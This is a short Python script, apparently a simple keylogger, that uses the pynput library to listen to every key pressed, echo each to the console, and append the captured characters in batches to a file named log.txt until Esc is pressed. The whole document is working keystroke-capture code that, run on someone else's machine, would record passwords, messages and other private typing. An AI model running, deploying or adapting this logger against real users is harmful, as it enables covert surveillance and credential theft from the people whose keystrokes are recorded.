import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1000:
        count = 0
        write_file(keys)
        keys = []



def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            con = str(key).replace("'","")
            if con.find("space") > 0:
                file.write("\n")
            elif con.find("Key") == -1: 
                file.write(con)  




def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()